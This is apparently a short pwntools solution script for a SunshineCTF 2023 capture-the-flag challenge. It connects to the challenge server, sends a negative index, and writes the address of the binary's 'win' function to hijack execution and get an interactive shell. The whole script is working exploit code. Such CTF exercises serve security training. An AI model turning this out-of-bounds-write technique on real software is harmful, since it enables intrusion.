from pwn import *

context.binary = exe = ELF('./sunshine')

io = remote('chal.2023.sunshinectf.games', 23003)

io.sendlineafter(b'>>> ', b'-8')
io.sendlineafter(b'>>>', p64(exe.sym['win']))
io.interactive()